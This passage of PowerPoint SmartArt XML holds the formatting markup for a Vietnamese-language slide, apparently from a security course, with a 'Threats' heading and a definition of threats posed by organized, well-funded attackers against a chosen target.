          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>mục</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>tiêu</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>, </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>áp</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>dụng</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>cho</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>đến</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>khi</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>mục</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>tiêu</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>bị</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>tổn</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>hại</a:t>
          </a:r>
          <a:endParaRPr lang="vi-VN" sz="2000" i="1" kern="1200" dirty="0"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="657211" y="1944145"/>
        <a:ext cx="5147335" cy="1530376"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{C762EB0F-9E8C-48F7-A209-FC8474A7DFBC}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="1219199" y="3793066"/>
          <a:ext cx="6908800" cy="1625600"/>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altLang="en-US" sz="2500" b="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Threats</a:t>
          </a:r>
          <a:endParaRPr lang="vi-VN" sz="2500" b="1" kern="1200" dirty="0"/>
        </a:p>
        <a:p>
          <a:pPr marL="228600" lvl="1" indent="-228600" algn="l" defTabSz="889000">
            <a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="15000"/>
            </a:spcAft>
            <a:buChar char="•"/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Mối</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>đe</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>dọa</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>đối</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>với</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>mục</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>tiêu</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>được</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>lựa</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>chọn</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> do </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>các</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>kẻ</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>tấn</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>công</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>có</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>tổ</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>chức</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>, </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>có</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>khả</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>năng</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>và</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>được</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>tài</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>trợ</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>, </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>làm</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>tăng</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>đáng</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>kể</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>mức</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>độ</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>đe</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0">
